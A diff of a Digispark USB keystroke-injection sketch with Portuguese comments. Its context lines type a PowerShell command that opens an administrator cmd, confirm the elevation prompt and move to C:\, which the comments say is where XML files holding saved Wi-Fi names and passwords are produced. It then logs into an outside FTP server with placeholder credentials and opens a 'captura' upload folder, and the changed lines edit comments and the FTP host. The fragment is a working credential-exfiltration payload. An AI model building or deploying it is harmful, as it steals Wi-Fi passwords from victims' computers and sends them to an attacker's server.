@@ -34,7 +34,7 @@ void setup() {
   DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3300);  //Demora um tempo maior para garantir acesso ao CMD.
+  DigiKeyboard.delay(3300);  //Demora um tempo maior para garantir acesso ao CMD como administrador.
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(60);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -51,7 +51,7 @@ void setup() {
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-//Posiciona o prompt na Raiz "C:\"
+//Posiciona o prompt na Raiz "C:\", onde serão gerados os .XML com os usuarios e senhas das Redes Wi-Fi.
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("cd C:\\");
   DigiKeyboard.delay(50);
@@ -59,21 +59,21 @@ void setup() {
 
 //Loga no FTP.
   DigiKeyboard.delay(50);
-  DigiKeyboard.print("ftp -i ftp.seudominio.com");  //Endereço do FTP.
+  DigiKeyboard.print("ftp -i ftp.seudominio.com.br");  //Endereço do FTP.
   DigiKeyboard.delay(60);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(800);
-  DigiKeyboard.print("admin");  //Usuario.
+  DigiKeyboard.print("admin");  //Usuario do FTP.
   DigiKeyboard.delay(80);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("pass");  //Senha.
+  DigiKeyboard.print("pass");  //Senha do FTP.
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  //Navega até o diretório onde sera salvo
+  //Navega até o diretório no FTP onde sera salvo.
   DigiKeyboard.delay(900);
   DigiKeyboard.print("cd captura");  //Diretório no ftp onde sera salvo os arquivos.. deve existir.
   DigiKeyboard.delay(80);
